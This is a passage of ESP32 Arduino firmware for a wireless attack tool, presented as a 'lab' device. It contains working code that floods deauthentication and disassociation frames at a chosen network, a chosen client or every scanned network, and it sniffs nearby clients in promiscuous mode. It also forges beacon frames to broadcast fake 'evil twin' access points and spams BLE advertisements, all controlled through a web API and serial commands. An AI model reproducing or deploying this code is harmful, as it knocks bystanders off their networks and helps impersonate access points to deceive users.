  WiFi.softAP(WEB_AP_SSID, pass, WEB_AP_CHANNEL);
  delay(200);
  s_mode = AttackMode::IDLE;
  s_deadline = 0;
  lab_log("Stopped. Device is idle.");
}

static uint8_t s_deauthHopChannel = 1;
static uint32_t s_lastDeauthTx = 0;
static uint32_t s_lastHop = 0;
static uint32_t s_txOk = 0;
static uint32_t s_txFail = 0;
static uint32_t s_lastTxLog = 0;

static void startDeauth(int idx, unsigned long secs) {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  if (idx < 0 || idx >= s_scanCount) {
    lab_log("Select a valid Wi-Fi network first.");
    return;
  }
  memcpy(s_targetBssid, s_scanBssids[idx], 6);
  s_targetChannel = s_scanChannels[idx];
  s_targetSsid = s_scanSsids[idx];
  s_deauthHopChannel = s_targetChannel;

  WiFi.mode(WIFI_AP_STA);            // keep the softAP alive
  delay(50);
  inject_begin(s_targetChannel);     // promiscuous + lock radio to target channel
  s_txOk = 0;
  s_txFail = 0;
  s_lastTxLog = 0;
  s_mode = AttackMode::DEAUTH;
  s_deadline = millis() + secs * 1000UL;
  lab_log("⚡ Wi-Fi Death on '" + s_targetSsid + "' (" + macStr(s_targetBssid) +
          ") ch " + String(s_targetChannel) + " for " + String(secs) + "s");
}

static void startDeauthAll(unsigned long secs) {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  if (s_scanCount == 0) {
    lab_log("No Wi-Fi networks scanned yet. Run 'scan' first.");
    return;
  }
  memset(s_targetBssid, 0, 6);
  s_targetChannel = 0;               // 0 = hop through every scanned network
  s_targetSsid = "*ALL*";
  s_deauthHopChannel = 1;

  WiFi.mode(WIFI_AP_STA);
  delay(50);
  inject_begin(1);
  s_txOk = 0;
  s_txFail = 0;
  s_lastTxLog = 0;
  s_mode = AttackMode::DEAUTH;
  s_deadline = millis() + secs * 1000UL;
  lab_log("🌐 Wi-Fi Death on ALL " + String(s_scanCount) +
          " scanned networks for " + String(secs) + "s");
}

static void deauth_tick() {
  uint32_t now = millis();

  if (s_targetChannel == 0) {
    // All-networks mode: hop channels and deauth every AP seen on that channel.
    if (now - s_lastHop >= 100) {
      s_lastHop = now;
      s_deauthHopChannel = (s_deauthHopChannel % 13) + 1; // 1..14
      esp_wifi_set_channel(s_deauthHopChannel, WIFI_SECOND_CHAN_NONE);
    }
    if (now - s_lastDeauthTx < 12) return;
    s_lastDeauthTx = now;
    for (int i = 0; i < s_scanCount; i++) {
      if (s_scanChannels[i] != s_deauthHopChannel) continue;
      for (int b = 0; b < 3; b++) {
        if (inject_deauth(s_scanBssids[i], kBroadcast, 1)) s_txOk++; else s_txFail++;
        if (inject_disassoc(s_scanBssids[i], kBroadcast, 3)) s_txOk++; else s_txFail++;
      }
    }
  } else {
    // Fixed-channel mode: either one specific client, or broadcast to the AP.
    if (now - s_lastDeauthTx < 4) return;
    s_lastDeauthTx = now;
    for (int b = 0; b < 3; b++) {
      if (s_hasTargetClient) {
        if (inject_deauth(s_targetBssid, s_targetClient, 1)) s_txOk++; else s_txFail++;
        if (inject_disassoc(s_targetBssid, s_targetClient, 3)) s_txOk++; else s_txFail++;
      } else {
        if (inject_deauth(s_targetBssid, kBroadcast, 1)) s_txOk++; else s_txFail++;
        if (inject_disassoc(s_targetBssid, kBroadcast, 3)) s_txOk++; else s_txFail++;
      }
    }
  }

  // Periodic TX health report so you can tell the override is linked:
  // ok should climb and fail should stay near zero.
  if (now - s_lastTxLog >= 2000) {
    s_lastTxLog = now;
    lab_log("⚡ TX: " + String(s_txOk) + " ok, " + String(s_txFail) + " dropped");
  }
}

static void startBle(unsigned long secs) {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  ensureBleInit();
  ble_spam_begin();
  s_mode = AttackMode::BLE_SPAM;
  s_deadline = millis() + secs * 1000UL;
  lab_log("📡 BLE Death started (" + String(secs) + "s)");
}

static void beacon_tick();

static void lab_tick() {
  if (s_mode == AttackMode::IDLE) return;

  // Auto-stop on deadline
  if (s_deadline > 0 && millis() > s_deadline) {
    lab_log("Attack finished: " + String(modeName(s_mode)));
    lab_stop();
    return;
  }

  switch (s_mode) {
    case AttackMode::DEAUTH:
    case AttackMode::DEAUTH_CLIENT:
      deauth_tick();
      break;
    case AttackMode::BEACON_SPAM:
      beacon_tick();
      break;
    case AttackMode::BLE_SPAM:
      ble_spam_tick();
      break;
    default: break;
  }
}

static void lab_start_scan() {
  if (s_wifiScanning) return;
  s_scanCount = 0;
  s_wifiScanning = true;
  // Switch to AP+STA so AP stays alive during scan
  WiFi.mode(WIFI_AP_STA);
  delay(50);
  IPAddress ip(192,168,4,1), gw(192,168,4,1), sn(255,255,255,0);
  WiFi.softAPConfig(ip, gw, sn);
  const char* pass = (WEB_AP_PASS[0] && strlen(WEB_AP_PASS) >= 8) ? WEB_AP_PASS : nullptr;
  WiFi.softAP(WEB_AP_SSID, pass, WEB_AP_CHANNEL);
  // Start async non-blocking scan
  WiFi.scanNetworks(true, true);
  lab_log("Scanning Wi-Fi networks...");
}

static void lab_scan_tick() {
  if (!s_wifiScanning) return;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return; // still scanning
  if (n > 0) {
    s_scanCount = min(n, kMaxScan);
    for (int i = 0; i < s_scanCount; i++) {
      s_scanSsids[i] = WiFi.SSID(i);
      memcpy(s_scanBssids[i], WiFi.BSSID(i), 6);
      s_scanChannels[i] = (uint8_t)WiFi.channel(i);
      s_scanRssi[i] = WiFi.RSSI(i);
    }
    WiFi.scanDelete();
    lab_log("Wi-Fi scan done: " + String(s_scanCount) + " networks found");
  } else {
    lab_log("Wi-Fi scan done: 0 networks found");
  }
  s_wifiScanning = false;
}

// ---------------------------------------------------------------------------
//  Client Discovery & Targeted Deauth
// ---------------------------------------------------------------------------
static bool macEq(const uint8_t a[6], const uint8_t b[6]) {
  for (int i = 0; i < 6; i++) {
    if (a[i] != b[i]) return false;
  }
  return true;
}

static int find_ap_idx(const uint8_t mac[6]) {
  for (int i = 0; i < s_scanCount; i++) {
    if (macEq(s_scanBssids[i], mac)) return i;
  }
  return -1;
}

static void client_add(const uint8_t mac[6], int apIdx, int rssi) {
  if (s_clientCount >= kMaxClients) return;
  for (int i = 0; i < s_clientCount; i++) {
    if (macEq(s_clientMacs[i], mac)) {
      if (apIdx >= 0 && s_clientApIdx[i] < 0) s_clientApIdx[i] = apIdx;
      s_clientRssi[i] = rssi;
      return;
    }
  }
  memcpy(s_clientMacs[s_clientCount], mac, 6);
  s_clientApIdx[s_clientCount] = apIdx;
  s_clientRssi[s_clientCount] = rssi;
  s_clientCount++;
}

static void sniff_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *payload = pkt->payload;
  uint16_t fc = payload[0] | (payload[1] << 8);
  uint8_t ftype = (fc >> 2) & 0x03;
  uint8_t subtype = (fc >> 4) & 0x0F;
  uint8_t to_ds = (fc >> 8) & 0x01;
  uint8_t from_ds = (fc >> 9) & 0x01;
  int rssi = (int)pkt->rx_ctrl.rssi;

  // Data frames reveal which station is talking to which AP.
  if (ftype == 2) {
    const uint8_t *a1 = &payload[4];
    const uint8_t *a2 = &payload[10];
    if (to_ds && !from_ds) {
      // Client -> AP: a1 = AP BSSID, a2 = client
      client_add(a2, find_ap_idx(a1), rssi);
    } else if (from_ds && !to_ds) {
      // AP -> Client: a1 = client, a2 = AP BSSID
      client_add(a1, find_ap_idx(a2), rssi);
    }
  } else if (ftype == 0 && subtype == 4) {
    // Probe request: a2 = client MAC (unassociated).
    client_add(&payload[10], -1, rssi);
  }
}

static void lab_start_client_scan() {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  if (s_scanCount == 0) {
    lab_log("Run a Wi-Fi scan first (no networks known).");
    return;
  }
  s_clientCount = 0;
  s_hasTargetClient = false;
  s_clientScanning = true;
  s_clientScanStart = millis();
  s_lastClientHop = 0;
  s_clientScanChannel = 1;

  WiFi.mode(WIFI_AP_STA);
  delay(50);
  esp_wifi_set_promiscuous_rx_cb(sniff_rx_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(s_clientScanChannel, WIFI_SECOND_CHAN_NONE);
  lab_log("Sniffing for connected clients...");
}

static void lab_client_scan_tick() {
  if (!s_clientScanning) return;
  uint32_t now = millis();

  if (now - s_lastClientHop >= 250) {
    s_lastClientHop = now;
    s_clientScanChannel = (s_clientScanChannel % 13) + 1;
    esp_wifi_set_channel(s_clientScanChannel, WIFI_SECOND_CHAN_NONE);
  }

  if (now - s_clientScanStart < kClientScanMs) return;

  s_clientScanning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  WiFi.mode(WIFI_OFF);
  delay(50);
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  IPAddress ip(192,168,4,1), gw(192,168,4,1), sn(255,255,255,0);
  WiFi.softAPConfig(ip, gw, sn);
  const char* pass = (WEB_AP_PASS[0] && strlen(WEB_AP_PASS) >= 8) ? WEB_AP_PASS : nullptr;
  WiFi.softAP(WEB_AP_SSID, pass, WEB_AP_CHANNEL);
  delay(200);

  lab_log("Client scan done: " + String(s_clientCount) + " clients found");
  for (int i = 0; i < s_clientCount; i++) {
    String ap = (s_clientApIdx[i] >= 0) ? s_scanSsids[s_clientApIdx[i]] : String("*unassociated*");
    lab_log(String(i) + ": " + macStr(s_clientMacs[i]) + " on " + ap);
  }
}

static void startDeauthClient(int clientIdx, unsigned long secs) {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  if (clientIdx < 0 || clientIdx >= s_clientCount) {
    lab_log("Invalid client index. Run 'clients' first.");
    return;
  }
  int apIdx = s_clientApIdx[clientIdx];
  if (apIdx < 0) {
    lab_log("That client is not associated with a scanned network.");
    return;
  }

  memcpy(s_targetBssid, s_scanBssids[apIdx], 6);
  s_targetChannel = s_scanChannels[apIdx];
  s_targetSsid = s_scanSsids[apIdx];
  memcpy(s_targetClient, s_clientMacs[clientIdx], 6);
  s_hasTargetClient = true;
  s_deauthHopChannel = s_targetChannel;

  WiFi.mode(WIFI_AP_STA);
  delay(50);
  inject_begin(s_targetChannel);
  s_txOk = 0;
  s_txFail = 0;
  s_lastTxLog = 0;
  s_mode = AttackMode::DEAUTH_CLIENT;
  s_deadline = millis() + secs * 1000UL;
  lab_log("âš¡ Deauthing client " + macStr(s_targetClient) + " on '" +
          s_targetSsid + "' for " + String(secs) + "s");
}

// ---------------------------------------------------------------------------
//  Fake Wi-Fi (Evil Twin / Beacon Spam)
// ---------------------------------------------------------------------------
static void beacon_set_ssid(const String& name) {
  String n = name;
  n.trim();
  if (n.length() == 0) {
    lab_log("SSID name is empty.");
    return;
  }
  if (n.length() > 32) n = n.substring(0, 32);
  s_beaconSsid = n;
  lab_log("Fake AP name set to: " + n);
}

static bool inject_beacon(const uint8_t bssid[6], const char* ssid) {
  uint8_t frame[128];
  int p = 0;

  frame[p++] = 0x80;  // Management, subtype Beacon
  frame[p++] = 0x00;
  frame[p++] = 0x00;  // Duration
  frame[p++] = 0x00;
  for (int i = 0; i < 6; i++) frame[p++] = 0xFF;  // DA = broadcast
  memcpy(&frame[p], bssid, 6); p += 6;            // SA
  memcpy(&frame[p], bssid, 6); p += 6;            // BSSID
  uint16_t seq = (s_beaconSeq++) & 0x0FFF;
  frame[p++] = seq & 0xFF;
  frame[p++] = (seq >> 8) & 0xFF;
  for (int i = 0; i < 8; i++) frame[p++] = 0x00;  // Timestamp
  frame[p++] = 0x64; frame[p++] = 0x00;           // Beacon interval = 100 ms
  frame[p++] = 0x31; frame[p++] = 0x04;           // Capability

  uint8_t len = (uint8_t)min((int)strlen(ssid), 32);
  frame[p++] = 0x00;                              // SSID IE
  frame[p++] = len;
  memcpy(&frame[p], ssid, len); p += len;

  const uint8_t rates[8] = {0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
  frame[p++] = 0x01;                              // Supported rates IE
  frame[p++] = 0x08;
  memcpy(&frame[p], rates, 8); p += 8;
  frame[p++] = 0x03;                              // DS parameter set
  frame[p++] = 0x01;
  frame[p++] = s_beaconChannel;

  if (p & 1) frame[p++] = 0x00;                   // keep length even

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
  if (err != ESP_OK) err = esp_wifi_80211_tx(WIFI_IF_STA, frame, p, false);
  return err == ESP_OK;
}

static void startBeaconSpam(unsigned long secs) {
  if (s_mode != AttackMode::IDLE) {
    lab_log("Stop the running attack first.");
    return;
  }
  if (s_beaconSsid.length() == 0) {
    lab_log("No fake AP name set. Use 'ssid <name>' first.");
    return;
  }
  for (int i = 0; i < kBeaconCount; i++) {
    for (int b = 0; b < 6; b++) s_beaconBssids[i][b] = (uint8_t)random(0, 256);
    s_beaconBssids[i][0] = (s_beaconBssids[i][0] & 0xFC) | 0x02;  // locally administered MAC
    s_beaconNames[i] = s_beaconSsid;
    if (i > 0) s_beaconNames[i] += "-" + String(i);
  }
  s_beaconChannel = 1;
  s_beaconSeq = 0;
  s_lastBeaconHop = 0;
  s_lastBeaconTx = 0;

  WiFi.mode(WIFI_AP_STA);
  delay(50);
  inject_begin(1);
  s_mode = AttackMode::BEACON_SPAM;
  s_deadline = millis() + secs * 1000UL;
  lab_log("Broadcasting " + String(kBeaconCount) + " fake APs from '" +
          s_beaconSsid + "' for " + String(secs) + "s");
}

static void beacon_tick() {
  uint32_t now = millis();
  if (now - s_lastBeaconHop >= 200) {
    s_lastBeaconHop = now;
    s_beaconChannel = (s_beaconChannel % 13) + 1;
    esp_wifi_set_channel(s_beaconChannel, WIFI_SECOND_CHAN_NONE);
  }
  if (now - s_lastBeaconTx < 50) return;
  s_lastBeaconTx = now;
  for (int i = 0; i < kBeaconCount; i++) {
    inject_beacon(s_beaconBssids[i], s_beaconNames[i].c_str());
  }
}

// ---------------------------------------------------------------------------
//  Web Server & REST API
// ---------------------------------------------------------------------------
static WebServer s_http(80);

static void sendJson(int code, const String& body) {
  s_http.send(code, "application/json", body);
}

static void handleState() {
  String json = "{";
  json += "\"armed\":" + String(s_armed ? "true" : "false") + ",";
  json += "\"mode\":\"" + String(modeName(s_mode)) + "\",";
  unsigned long rem = (s_deadline > millis()) ? (s_deadline - millis()) / 1000UL : 0;
  json += "\"remaining\":" + String(rem) + ",";
  json += "\"wifi_scanning\":" + String(s_wifiScanning ? "true" : "false") + ",";
  json += "\"ble_scanning\":" + String(s_bleScanning ? "true" : "false") + ",";
  json += "\"client_scanning\":" + String(s_clientScanning ? "true" : "false") + ",";
  json += "\"log\":\"" + jsonEscape(lab_log_text()) + "\",";
  
  // Wi-Fi Scan Array
  json += "\"scan\":[";
  for (int i = 0; i < s_scanCount; i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + jsonEscape(s_scanSsids[i]) + "\",";
    json += "\"bssid\":\"" + macStr(s_scanBssids[i]) + "\",";
    json += "\"ch\":" + String(s_scanChannels[i]) + ",";
    json += "\"rssi\":" + String(s_scanRssi[i]) + "}";
  }
  json += "],";

  // Clients Array
  json += "\"clients\":[";
  for (int i = 0; i < s_clientCount; i++) {
    if (i > 0) json += ",";
    json += "{\"mac\":\"" + macStr(s_clientMacs[i]) + "\",";
    json += "\"ap\":\"" + (s_clientApIdx[i] >= 0 ? jsonEscape(s_scanSsids[s_clientApIdx[i]]) : String("")) + "\",";
    json += "\"rssi\":" + String(s_clientRssi[i]) + "}";
  }
  json += "],";

  // Fake AP config
  json += "\"beacon_ssid\":\"" + jsonEscape(s_beaconSsid) + "\",";
  json += "\"beacon_count\":" + String(kBeaconCount) + ",";

  // BLE Scan Array
  json += "\"ble\":[";
  for (int i = 0; i < s_bleCount; i++) {
    if (i > 0) json += ",";
    json += "{\"name\":\"" + jsonEscape(s_bleNames[i]) + "\",";
    json += "\"addr\":\"" + jsonEscape(s_bleAddrs[i]) + "\",";
    json += "\"rssi\":" + String(s_bleRssi[i]) + "}";
  }
  json += "]}";

  sendJson(200, json);
}

static void handleArm() {
  String body = s_http.arg("plain");
  bool arm = body.indexOf("true") >= 0;
  if (!arm && s_mode != AttackMode::IDLE) lab_stop();
  s_armed = arm;
  lab_log(arm ? "Device Armed" : "Device Disarmed");
  sendJson(200, "{\"ok\":true}");
}

static void handleScan() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"Stop the running attack first.\"}");
    return;
  }
  lab_start_scan();
  sendJson(200, "{\"ok\":true}");
}

static void handleBleScan() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"Stop the running attack first.\"}");
    return;
  }
  lab_start_ble_scan();
  sendJson(200, "{\"ok\":true}");
}

static void handleClientScan() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"Stop the running attack first.\"}");
    return;
  }
  lab_start_client_scan();
  sendJson(200, "{\"ok\":true}");
}

static void handleSsid() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"Stop the running attack first.\"}");
    return;
  }
  String name = s_http.arg("name");
  beacon_set_ssid(name);
  sendJson(200, "{\"ok\":true}");
}

static void handleBeacon() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"An attack is already running. Stop it first.\"}");
    return;
  }
  unsigned long secs = 60UL;
  if (s_http.hasArg("secs") && s_http.arg("secs").length()) {
    secs = (unsigned long)constrain(s_http.arg("secs").toInt(), 1, 300);
  }
  startBeaconSpam(secs);
  sendJson(200, "{\"ok\":true}");
}

static void handleDeauthClient() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"An attack is already running. Stop it first.\"}");
    return;
  }
  int idx = -1;
  if (s_http.hasArg("idx") && s_http.arg("idx").length()) {
    idx = s_http.arg("idx").toInt();
  }
  unsigned long secs = EDU_ATTACK_MS / 1000UL;
  if (s_http.hasArg("secs") && s_http.arg("secs").length()) {
    secs = (unsigned long)constrain(s_http.arg("secs").toInt(), 1, 300);
  }
  if (idx < 0 || idx >= s_clientCount) {
    sendJson(400, "{\"ok\":false,\"error\":\"Invalid client index. Run a client scan first.\"}");
    return;
  }
  startDeauthClient(idx, secs);
  sendJson(200, "{\"ok\":true}");
}

static void handleDeauth() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"An attack is already running. Stop it first.\"}");
    return;
  }
  int idx = -1; // -1 => deauth every scanned network
  if (s_http.hasArg("idx") && s_http.arg("idx").length()) {
    idx = s_http.arg("idx").toInt();
  }
  unsigned long secs = EDU_ATTACK_MS / 1000UL;
  if (s_http.hasArg("secs") && s_http.arg("secs").length()) {
    secs = (unsigned long)constrain(s_http.arg("secs").toInt(), 1, 300);
  }

  if (idx == -1) {
    if (s_scanCount == 0) {
      sendJson(400, "{\"ok\":false,\"error\":\"No Wi-Fi networks scanned yet.\"}");
      return;
    }
    startDeauthAll(secs);
  } else {
    if (idx < 0 || idx >= s_scanCount) {
      sendJson(400, "{\"ok\":false,\"error\":\"Invalid Wi-Fi network index.\"}");
      return;
    }
    startDeauth(idx, secs);
  }
  sendJson(200, "{\"ok\":true}");
}

static void handleBle() {
  if (s_mode != AttackMode::IDLE) {
    sendJson(400, "{\"ok\":false,\"error\":\"An attack is already running. Stop it first.\"}");
    return;
  }
  unsigned long secs = EDU_ATTACK_MS / 1000UL;
  if (s_http.hasArg("secs") && s_http.arg("secs").length()) {
    secs = (unsigned long)constrain(s_http.arg("secs").toInt(), 1, 300);
  }
  startBle(secs);
  sendJson(200, "{\"ok\":true}");
}

static void handleStop() {
  lab_stop();
  sendJson(200, "{\"ok\":true}");
}

static void webui_begin() {
  s_http.on("/", []() { s_http.send(200, "text/html", kIndexHtml); });
  s_http.on("/generate_204", []() { s_http.send(200, "text/html", kIndexHtml); });
  s_http.on("/hotspot-detect.html", []() { s_http.send(200, "text/html", kIndexHtml); });
  s_http.on("/api/state",   HTTP_GET,  handleState);
  s_http.on("/api/arm",     HTTP_POST, handleArm);
  s_http.on("/api/scan",    HTTP_POST, handleScan);
  s_http.on("/api/blescan", HTTP_POST, handleBleScan);
  s_http.on("/api/clients", HTTP_POST, handleClientScan);
  s_http.on("/api/ssid",    HTTP_POST, handleSsid);
  s_http.on("/api/beacon",  HTTP_POST, handleBeacon);
  s_http.on("/api/deauth",  HTTP_POST, handleDeauth);
  s_http.on("/api/deauthc", HTTP_POST, handleDeauthClient);
  s_http.on("/api/ble",     HTTP_POST, handleBle);
  s_http.on("/api/stop",    HTTP_POST, handleStop);
  s_http.onNotFound([]() { s_http.send(200, "text/html", kIndexHtml); });
  s_http.begin();
}

// ---------------------------------------------------------------------------
//  Serial Command Parser
// ---------------------------------------------------------------------------
static void handleSerialCmd(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  Serial.println("> " + cmd);

  String lower = cmd;
  lower.toLowerCase();

  if (cmd.equalsIgnoreCase("scan") || cmd.equalsIgnoreCase("wifiscan")) {
    if (s_mode != AttackMode::IDLE) { lab_log("Stop the running attack first."); return; }
    lab_start_scan();
  } else if (cmd.equalsIgnoreCase("blescan") || cmd.equalsIgnoreCase("btscan")) {
    if (s_mode != AttackMode::IDLE) { lab_log("Stop the running attack first."); return; }
    lab_start_ble_scan();
  } else if (cmd.equalsIgnoreCase("clients") || cmd.equalsIgnoreCase("clientscan")) {
    if (s_mode != AttackMode::IDLE) { lab_log("Stop the running attack first."); return; }
    lab_start_client_scan();
  } else if (lower.startsWith("ssid")) {
    String rest = cmd.substring(4);
    rest.trim();
    beacon_set_ssid(rest);
  } else if (lower.startsWith("beacon")) {
    String rest = cmd.substring(6);
    rest.trim();
    unsigned long secs = 60UL;
    if (rest.length() > 0) secs = (unsigned long)constrain(rest.toInt(), 1, 300);
    startBeaconSpam(secs);
  } else if (lower.startsWith("deauthc")) {
    String rest = cmd.substring(7);
    rest.trim();
    if (rest.length() == 0) {
      lab_log("Usage: deauthc <client index> [secs]  (run 'clients' first)");
    } else {
      int sp = rest.indexOf(' ');
      String idxTok = sp < 0 ? rest : rest.substring(0, sp);
      String secTok = sp < 0 ? "" : rest.substring(sp + 1);
      secTok.trim();
      int idx = idxTok.toInt();
      unsigned long secs = EDU_ATTACK_MS / 1000UL;
      if (secTok.length() > 0) secs = (unsigned long)constrain(secTok.toInt(), 1, 300);
      startDeauthClient(idx, secs);
    }
  } else if (lower.startsWith("deauth")) {
    String rest = cmd.substring(6);
    rest.trim();
    int idx = -1;
    unsigned long secs = EDU_ATTACK_MS / 1000UL;
    if (rest.length() > 0 && !rest.equalsIgnoreCase("all")) {
      int sp = rest.indexOf(' ');
      String idxTok = sp < 0 ? rest : rest.substring(0, sp);
      String secTok = sp < 0 ? "" : rest.substring(sp + 1);
      secTok.trim();
      idx = idxTok.toInt();
      if (secTok.length() > 0) secs = (unsigned long)constrain(secTok.toInt(), 1, 300);
    }
    if (rest.equalsIgnoreCase("all")) {
      startDeauthAll(secs);
    } else if (idx < 0 || idx >= s_scanCount) {
      lab_log("Usage: deauth <network index|all> [secs]  (see scan list)");
    } else {
      startDeauth(idx, secs);
    }
  } else if (lower.startsWith("ble")) {
    String rest = cmd.substring(3);
    rest.trim();
    unsigned long secs = EDU_ATTACK_MS / 1000UL;
    if (rest.length() > 0) secs = (unsigned long)constrain(rest.toInt(), 1, 300);
    startBle(secs);
  } else if (cmd.equalsIgnoreCase("stop")) {
    lab_stop();
  } else if (cmd.equalsIgnoreCase("arm")) {
    s_armed = true;
    lab_log("Armed via serial");
  } else if (cmd.equalsIgnoreCase("disarm")) {
    s_armed = false;
    lab_log("Disarmed via serial");
  } else if (cmd.equalsIgnoreCase("help")) {
    Serial.println("Commands:");
    Serial.println("  scan                  - scan Wi-Fi networks");
    Serial.println("  blescan               - scan BLE devices");
    Serial.println("  clients               - sniff connected clients (12s)");
    Serial.println("  ssid <name>           - set the fake AP name to broadcast");
    Serial.println("  beacon [s]            - broadcast 15 fake APs with that name (default 60s)");
    Serial.println("  deauth <idx|all> [s]  - Wi-Fi Death on selected network (index from scan)");
    Serial.println("  deauthc <idx> [s]     - deauth one client (index from 'clients')");
    Serial.println("  ble [s]               - BLE advertisement spam");
    Serial.println("  stop                  - stop everything");
    Serial.println("  arm | disarm          - arm/disarm flag");
  } else {
    Serial.println("Unknown command. Type 'help' for available commands.");
  }
}

// ---------------------------------------------------------------------------
//  Arduino Setup & Loop
// ---------------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(300);

  // Start Access Point
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  IPAddress ip(192,168,4,1), gw(192,168,4,1), sn(255,255,255,0);
  WiFi.softAPConfig(ip, gw, sn);
  const char* pass = (WEB_AP_PASS[0] && strlen(WEB_AP_PASS) >= 8) ? WEB_AP_PASS : nullptr;
  bool ok = WiFi.softAP(WEB_AP_SSID, pass, WEB_AP_CHANNEL);
  delay(300);

  Serial.printf("[AP] '%s' started: %s | IP: %s\n",
                WEB_AP_SSID, ok ? "OK" : "FAILED",
                WiFi.softAPIP().toString().c_str());

  webui_begin();

  Serial.printf("Web UI ready -> connect to '%s' -> http://192.168.4.1\n", WEB_AP_SSID);
  lab_log("Lab ready! Connect to " + String(WEB_AP_SSID) + " -> http://192.168.4.1");

  // Auto-Scan both Wi-Fi and Bluetooth on startup!
  lab_start_scan();
  lab_start_ble_scan();
}

void loop() {
  s_http.handleClient();
  lab_tick();
  lab_scan_tick();
  lab_client_scan_tick();

  // Serial commands
  if (Serial.available()) {
    String line = Serial.readStringUntil('\n');
    handleSerialCmd(line);
  }
}